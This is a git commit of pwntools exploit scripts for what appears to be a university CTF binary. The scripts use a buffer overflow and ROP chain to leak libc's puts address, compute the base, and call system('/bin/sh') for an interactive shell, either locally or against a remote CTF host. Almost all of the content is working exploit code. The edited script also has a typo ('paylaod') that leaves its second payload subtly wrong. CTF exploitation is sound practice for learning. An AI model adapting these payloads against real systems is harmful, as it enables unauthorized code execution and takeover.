aa3ac9457a678fee61cc47adfc468be044f32adb
Darell Hendry <1darellhendry@gmail.com>
2020-03-16 13:28:28 +0700

    ret2libc

---
+++ after_leaked_libc.py
@@ -0,0 +1,49 @@
+from pwn import *
+
+# r = remote('ctf99.cs.ui.ac.id', 9131)
+r = process('./libc_sequel.dms')
+# libc = ELF('./libc6-i386_2.23-0ubuntu11_amd64.so')
+libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+e = ELF('./libc_sequel.dms')
+rop = ROP(e)
+
+# libc function address and offset
+PUTS_OFFSET = libc.symbols['puts']
+SYSTEM_OFFSET = libc.symbols['system']
+BINSH_OFFSET = list(libc.search(b'/bin/sh'))[0]
+PUTS = e.plt['puts']
+# PUTS_ADDR = 0xf765b140
+# PUTS_ADDR = 0xf75e0540
+PUTS_ADDR = 0xf7df2b40
+# PUTS_ADDR = 0xf7d83d90
+
+
+LIBC_BASE = PUTS_ADDR - PUTS_OFFSET
+
+'''
+0xf7581400 | 0xf7dda200
+0xf75bbd40
+0xf76da42b
+
+0xf7d8b000
+0xf7dc8200 | 0xf7d52200
+0xf7f090cf
+'''
+
+print(hex(LIBC_BASE))
+system_addr = LIBC_BASE + SYSTEM_OFFSET
+binsh_addr = LIBC_BASE + BINSH_OFFSET
+
+print(hex(system_addr))
+print(hex(binsh_addr))
+
+# ROP gadget
+POP_EBX = rop.find_gadget(['pop ebx', 'ret'])[0]
+
+payload = b'A'*20
+payload += p32(system_addr)
+payload += p32(POP_EBX)
+payload += p32(binsh_addr)
+
+r.sendlineafter('shell', payload)
+r.interactive()
--- sequel_libc.py
+++ sequel_libc.py
@@ -1,32 +1,34 @@
 from pwn import *
 
-# r = process('./libc_sequel.dms')
 r = remote('ctf99.cs.ui.ac.id', 9131)
-
+# r = process('./libc_sequel.dms')
 libc = ELF('./libc6-i386_2.23-0ubuntu11_amd64.so')
+# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
 
 # collect address of system and /bin/sh
 system_offset = libc.symbols['system']
 binsh_offset = list(libc.search(b'/bin/sh'))[0]
 puts_offset = libc.symbols['puts']
 
-print('[*] system offset:', hex(system_offset))
-print('[*] binsh offset:', hex(binsh_offset))
+# print('[*] system offset:', hex(system_offset))
+# print('[*] binsh offset:', hex(binsh_offset))
 
 # find libc base address pake puts
 e = ELF('./libc_sequel.dms')
 rop = ROP(e)
 
 PUTS = e.plt['puts']
-GETS = e.plt['gets']
+# GETS = e.plt['gets']
+vuln = 0x08049196
 
 LIBC_START_MAIN = 0x804C014
 PUTS_GOT = 0x0804c010
-# GET_GOT = 0x0804c00c
+GETS_GOT = 0x0804c00c
 POP_EBX = rop.find_gadget(['pop ebx', 'ret'])[0] # 0x08049022
 
 payload = b'A'*20
-payload += p32(PUTS) + p32(POP_EBX) + p32(PUTS_GOT) + p32(GETS)
+# payload += p32(PUTS) + p32(POP_EBX) + p32(PUTS_GOT) + p32(GETS) + p32(GETS) + p32(GETS)
+payload += p32(PUTS) + p32(POP_EBX) + p32(PUTS_GOT) + p32(vuln) 
 with open('payload', 'wb') as out:
 	out.write(payload)
 r.sendlineafter('shell', payload)
@@ -35,25 +37,35 @@ print(r.recvline())
 print(r.recvline())
 print(r.recvline())
 # print(r.recvline())
-recieved = r.recv(10)
-leak  = hex(u32(recieved[4:8].ljust(4, b'\x00')))
+recieved = r.recvline().strip()
+leak  = hex(u32(recieved[:4].ljust(4, b'\x00')))
 print('LEAKED:', leak)
 
-PUT_ADDR = int(leak, 16)
 
+PUT_ADDR = int(leak, 16)
 LIBC_BASE = PUT_ADDR - puts_offset
-print(hex(LIBC_BASE))
 
 # assemble payload for system('/bin/sh')
 system_address = LIBC_BASE + system_offset
 binsh_address = LIBC_BASE + binsh_offset
+paylaod = b'A'*20
 payload += p32(system_address)
 payload += p32(POP_EBX)
 payload += p32(binsh_address)
+
+
+
+# payload = b'A'*20 + p32(PUTS) + p32(POP_EBX) + p32(GETS_GOT)
+
 r.sendline(payload)
-# r.interactive()
+# recieved = r.recvline().strip()
+# leak  = hex(u32(recieved[:4].ljust(4, b'\x00')))
+# print('LEAKED:', leak)
 
-
-
-
+# r.sendline(payload)
 r.interactive()
+
+
+
+
+# r.interactive()
